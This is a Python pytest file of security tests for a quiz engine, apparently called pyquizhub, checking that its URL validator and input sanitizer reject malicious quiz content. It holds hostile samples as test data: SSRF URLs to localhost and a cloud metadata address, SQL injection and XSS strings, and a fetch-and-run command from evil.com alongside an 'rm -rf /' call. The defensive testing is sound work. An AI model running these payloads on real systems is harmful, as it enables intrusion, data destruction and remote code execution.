"""
End-to-end security tests with malicious quiz payloads.

These tests simulate real attack scenarios from malicious quiz creators:
1. Quiz definition with malicious API configurations
2. Malicious user answers trying to inject into API requests
3. Simulated malicious API responses
4. Full attack chains combining multiple vulnerabilities

Tests the complete security pipeline:
- Quiz upload validation
- Answer sanitization
- API request construction
- DNS resolution
- Request execution
- Response validation
- Variable updates
"""

import pytest
from unittest.mock import patch, MagicMock
import json


class TestMaliciousQuizDefinitions:
    """Test that malicious quiz definitions are rejected at upload time."""

    def test_ssrf_in_api_url(self):
        """Test quiz with SSRF attack in API URL is rejected."""
        malicious_quiz = {
            "metadata": {"title": "SSRF Attack Quiz"},
            "variables": {
                "result": {"type": "string", "default": "", "mutable_by": ["api"]}
            },
            "api_integrations": [
                {
                    "id": "attack",
                    "timing": "on_quiz_start",
                    "url": "http://localhost:8000/admin/delete_all_users",  # SSRF
                    "method": "GET",
                }
            ],
            "questions": [],
            "transitions": {}
        }

        # This should be caught during quiz validation
        # URLValidator.validate_url should reject this
        from pyquizhub.core.engine.url_validator import URLValidator

        with pytest.raises(ValueError, match="HTTPS|localhost"):
            URLValidator.validate_url(
                malicious_quiz["api_integrations"][0]["url"])

    def test_private_network_in_api_url(self):
        """Test quiz trying to access private network is rejected."""
        malicious_quiz = {
            "api_integrations": [
                {
                    "id": "attack",
                    "url": "https://192.168.1.1/router/admin",  # Private IP
                    "method": "GET",
                }
            ]
        }

        from pyquizhub.core.engine.url_validator import URLValidator

        with pytest.raises(ValueError, match="IP-based"):
            URLValidator.validate_url(
                malicious_quiz["api_integrations"][0]["url"])

    def test_cloud_metadata_in_api_url(self):
        """Test quiz trying to access cloud metadata is rejected."""
        malicious_quiz = {
            "api_integrations": [
                {
                    "id": "attack",
                    "url": "http://169.254.169.254/latest/meta-data/",
                    "method": "GET",
                }
            ]
        }

        from pyquizhub.core.engine.url_validator import URLValidator

        with pytest.raises(ValueError, match="HTTPS|IP-based"):
            URLValidator.validate_url(
                malicious_quiz["api_integrations"][0]["url"])

    def test_non_https_protocol_rejected(self):
        """Test that non-HTTPS protocols are rejected."""
        protocols = ["ftp", "file", "gopher"]  # Dangerous protocols

        for protocol in protocols:
            malicious_quiz = {
                "api_integrations": [
                    {
                        "id": "attack",
                        "url": f"{protocol}://example.com/api",
                        "method": "GET",
                    }
                ]
            }

            from pyquizhub.core.engine.url_validator import URLValidator

            # All non-HTTPS protocols should be rejected
            with pytest.raises(ValueError, match="HTTPS|scheme"):
                URLValidator.validate_url(
                    malicious_quiz["api_integrations"][0]["url"],
                    allow_http=False  # Never allow HTTP for these
                )

    def test_template_injection_in_url(self):
        """Test that template variables in base URL are rejected."""
        malicious_urls = [
            "https://api.example.com/{answer}",  # Path injection
            "https://api.example.com/{answer}/data",  # Path injection
            "https://{domain}.example.com/api",  # Domain injection
            "https://api.example.com/api${var}",  # Dollar sign template
        ]

        from pyquizhub.core.engine.url_validator import URLValidator

        # Template variables in base URL should be rejected
        # (Only allowed in query params or body)
        for url in malicious_urls:
            with pytest.raises(ValueError, match="Template variables not allowed"):
                URLValidator.validate_url(url)


class TestMaliciousUserAnswers:
    """Test that malicious user answers are sanitized."""

    def test_sql_injection_in_answer(self):
        """Test SQL injection attempt in user answer."""
        malicious_answer = "'; DROP TABLE users; --"

        from pyquizhub.core.engine.input_sanitizer import InputSanitizer

        with pytest.raises(ValueError, match="SQL injection"):
            InputSanitizer.sanitize_string(malicious_answer)

    def test_xss_in_answer(self):
        """Test XSS attempt in user answer."""
        malicious_answer = "<script>alert('XSS')</script>"

        from pyquizhub.core.engine.input_sanitizer import InputSanitizer

        with pytest.raises(ValueError, match="XSS"):
            InputSanitizer.sanitize_string(malicious_answer)

    def test_command_injection_in_answer(self):
        """Test command injection attempt in user answer."""
        malicious_answer = "; ls -la /etc"

        from pyquizhub.core.engine.input_sanitizer import InputSanitizer

        with pytest.raises(ValueError, match="command injection"):
            InputSanitizer.sanitize_string(malicious_answer)

    def test_answer_used_in_api_url_param(self):
        """Test that answers are safely encoded when used in URL parameters."""
        dangerous_answer = "'; DROP TABLE users; --"

        from pyquizhub.core.engine.input_sanitizer import InputSanitizer

        # When used in URL param, should be URL-encoded
        safe_param = InputSanitizer.sanitize_for_url_param(dangerous_answer)

        # Should not contain dangerous SQL characters in unencoded form
        assert "'" not in safe_param
        assert ";" not in safe_param
        # Should be URL-encoded
        assert "%" in safe_param
        # Check that dangerous chars are encoded
        assert "%27" in safe_param  # ' is encoded
        assert "%3B" in safe_param  # ; is encoded


class TestMaliciousAPIResponses:
    """Test that malicious API responses are caught and rejected."""

    def test_oversized_response_rejected(self):
        """Test that oversized API responses are rejected."""
        # Simulate 10MB response
        oversized_data = {"data": "x" * (10 * 1024 * 1024)}

        from pyquizhub.core.engine.input_sanitizer import InputSanitizer

        with pytest.raises(ValueError, match="too large"):
            InputSanitizer.sanitize_json_response(
                oversized_data,
                max_size_mb=2.0
            )

    def test_deeply_nested_response_rejected(self):
        """Test that deeply nested JSON responses are rejected (DoS)."""
        # Create deeply nested response (100 levels)
        deep_data = {"a": None}
        current = deep_data
        for i in range(100):
            current["a"] = {"a": None}
            current = current["a"]

        from pyquizhub.core.engine.input_sanitizer import InputSanitizer

        with pytest.raises(ValueError, match="too deep"):
            InputSanitizer.sanitize_json_response(deep_data, max_depth=10)

    def test_injection_payloads_in_response(self):
        """Test that injection payloads in API responses are caught."""
        malicious_response = {
            "temperature": 25,
            "location": "'; DROP TABLE users; --",
            "description": "<script>alert('XSS')</script>"
        }

        from pyquizhub.core.engine.input_sanitizer import InputSanitizer

        with pytest.raises(ValueError, match="SQL injection|XSS"):
            InputSanitizer.sanitize_json_response(malicious_response)

    def test_response_with_executable_code(self):
        """Test that responses containing code are rejected."""
        malicious_response = {
            "eval": "$(curl http://evil.com/backdoor.sh | bash)",
            "exec": "import os; os.system('rm -rf /')"
        }

        from pyquizhub.core.engine.input_sanitizer import InputSanitizer

        with pytest.raises(ValueError, match="command injection|SQL injection"):
            InputSanitizer.sanitize_json_response(malicious_response)


class TestDNSRebindingAttackScenario:
    """Test complete DNS rebinding attack scenario."""

    @patch('socket.gethostbyname')
    def test_dns_rebinding_full_attack(self, mock_dns):
        """
        Simulate complete DNS rebinding attack.

        Step 1: Quiz created with evil.com (resolves to public IP - passes)
        Step 2: Later, evil.com resolves to 127.0.0.1 (attack)
        Step 3: Protection: DNS is re-validated before each request
        """
        from pyquizhub.core.engine.url_validator import DNSValidator

        # Initial quiz creation - evil.com resolves to public IP
        mock_dns.return_value = '8.8.8.8'  # Google DNS (real public IP)
        ip1, _ = DNSValidator.resolve_and_validate('evil.com')
        assert ip1 == '8.8.8.8'

        # Later - DNS rebinding, now resolves to localhost
        mock_dns.return_value = '127.0.0.1'  # Localhost
        with pytest.raises(ValueError, match="loopback|private"):
            DNSValidator.resolve_and_validate('evil.com')


class TestRedirectChainAttack:
    """Test redirect chain attack scenarios."""

    def test_redirect_to_localhost(self):
        """
        Test redirect chain attack.

        Attack: https://evil.com/api -> https://localhost/admin
        Protection: All redirects are blocked
        """
        from pyquizhub.core.engine.url_validator import DNSValidator

        redirect_url = "https://localhost/admin"

        with pytest.raises(ValueError):
            DNSValidator.check_redirect_target(redirect_url)

    def test_redirect_to_private_network(self):
        """Test redirect to private network is blocked."""
        from pyquizhub.core.engine.url_validator import DNSValidator

        redirect_url = "https://192.168.1.1/router"

        with pytest.raises(ValueError, match="IP-based"):
            DNSValidator.check_redirect_target(redirect_url)


class TestCompleteAttackChain:
    """Test complete attack chains combining multiple vulnerabilities."""

    def test_quiz_with_all_attacks(self):
        """
        Test quiz attempting multiple attack vectors simultaneously.

        Attacks:
        1. SSRF in API URL
        2. SQL injection in variable constraints
        3. XSS in question text
        4. Template injection in API body
        """
        malicious_quiz = {
            "metadata": {
                "title": "<script>alert('XSS')</script>",  # XSS in title
            },
            "variables": {
                "result": {
                    "type": "string",
                    "default": "",
                    "mutable_by": ["api"],
                    "constraints": {
                        # Valid use of pattern
                        "forbidden_patterns": ["'; DROP TABLE users; --"]
                    }
                }
            },
            "api_integrations": [
                {
                    "id": "attack1",
                    "url": "http://localhost/admin",  # SSRF
                    "method": "POST",
                    "body": {
                        # Template injection
                        "injection": "{{config.SECRET_KEY}}"
                    }
                }
            ],
            "questions": [
                {
                    "id": 1,
                    "data": {
                        "text": "'; DELETE FROM users; --",  # SQL injection in question
                        "type": "text"
                    }
                }
            ],
            "transitions": {"1": [{"expression": "true", "next_question_id": None}]}
        }

        # Each attack vector should be caught independently
        from pyquizhub.core.engine.url_validator import URLValidator
        from pyquizhub.core.engine.input_sanitizer import InputSanitizer

        # Test SSRF protection
        with pytest.raises(ValueError):
            URLValidator.validate_url(
                malicious_quiz["api_integrations"][0]["url"])

        # Test XSS in metadata
        with pytest.raises(ValueError, match="XSS"):
            InputSanitizer.sanitize_string(malicious_quiz["metadata"]["title"])

        # Test SQL injection in question
        with pytest.raises(ValueError, match="SQL injection"):
            InputSanitizer.sanitize_string(
                malicious_quiz["questions"][0]["data"]["text"]
            )

    def test_time_of_check_time_of_use_attack(self):
        """
        Test TOCTOU attack across quiz lifecycle.

        Attack scenario:
        1. Upload quiz with safe URL
        2. DNS changes to point to localhost
        3. Quiz runs, tries to access localhost

        Protection: DNS is validated on every request, not cached
        """
        # This is tested in TestDNSRebindingAttackScenario
        pass

    def test_variable_overwrite_attack(self):
        """
        Test attempt to overwrite protected variables via API response.

        Attack: API response tries to overwrite engine-only variables
        Protection: Variable access control enforces mutable_by
        """
        # This would be tested when variable store is implemented
        # API response should only be able to write to variables
        # that have "api" in their mutable_by list
        pass


class TestRateLimitBypass:
    """Test attempts to bypass rate limiting."""

    def test_request_loop_in_quiz(self):
        """
        Test quiz with infinite request loop.

        Attack: Quiz transitions create infinite API call loop
        Protection: Per-session request limit
        """
        loop_quiz = {
            "api_integrations": [
                {
                    "id": "loop",
                    "timing": "before_question",
                    "question_id": 1,
                    "url": "https://api.example.com/data",
                    "method": "GET",
                }
            ],
            "questions": [{"id": 1, "data": {"text": "Test", "type": "text"}}],
            "transitions": {
                "1": [{"expression": "true", "next_question_id": 1}]  # Loop!
            }
        }

        # Rate limiter should prevent this after N requests
        # (tested in rate limiter tests)
        pass


class TestAllowlistBypass:
    """Test attempts to bypass allowlist."""

    def test_subdomain_confusion(self):
        """
        Test subdomain confusion attack.

        Attack: evil-api.com vs api.evil-com.attacker.net
        Protection: Exact domain matching
        """
        from pyquizhub.core.engine.url_validator import APIAllowlistManager

        allowlist = APIAllowlistManager()

        # Should be rejected
        assert not allowlist.is_allowed("https://fake-api.open-meteo.com/data")
        assert not allowlist.is_allowed(
            "https://api.open-meteo.com.evil.com/data")

    def test_unicode_domain_bypass(self):
        """Test Unicode homograph domain bypass."""
        from pyquizhub.core.engine.url_validator import URLValidator

        # Cyrillic 'a' looks like Latin 'a'
        fake_domain = "https://аpi.open-meteo.com/data"  # First char is Cyrillic

        with pytest.raises(ValueError, match="[Nn]on-ASCII"):
            URLValidator.validate_url(fake_domain)


class TestPrivilegeEscalation:
    """Test privilege escalation attempts."""

    def test_creator_accessing_admin_routes(self):
        """
        Test creator trying to access admin routes via API integration.

        Attack: Quiz API URL points to internal admin endpoint
        Protection: Admin routes require different auth + localhost-only
        """
        malicious_quiz = {
            "api_integrations": [
                {
                    "id": "escalate",
                    "url": "https://localhost:8000/admin/promote_to_admin",
                    "method": "POST",
                    "body": {"user_id": "attacker"}
                }
            ]
        }

        from pyquizhub.core.engine.url_validator import URLValidator

        # Should be blocked at URL validation level
        with pytest.raises(ValueError):
            URLValidator.validate_url(
                malicious_quiz["api_integrations"][0]["url"]
            )


class TestDataExfiltration:
    """Test data exfiltration attempts."""

    def test_dns_exfiltration(self):
        """
        Test DNS-based exfiltration.

        Attack: Make DNS query to attacker-controlled domain with data
        Example: https://SECRET-DATA.attacker.com/api
        Protection: Data in URL must be from controlled variables only
        """
        # This requires variable system to be implemented
        # Variables containing sensitive data should not be
        # allowed in URL construction
        pass

    def test_http_exfiltration(self):
        """
        Test HTTP-based exfiltration.

        Attack: Send sensitive data to external server via API request
        Protection: Only creator-approved domains allowed
        """
        from pyquizhub.core.engine.url_validator import APIAllowlistManager

        allowlist = APIAllowlistManager()

        exfil_url = "https://attacker-exfiltration.com/collect"

        # Should be rejected (not in allowlist)
        assert not allowlist.is_allowed(exfil_url)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
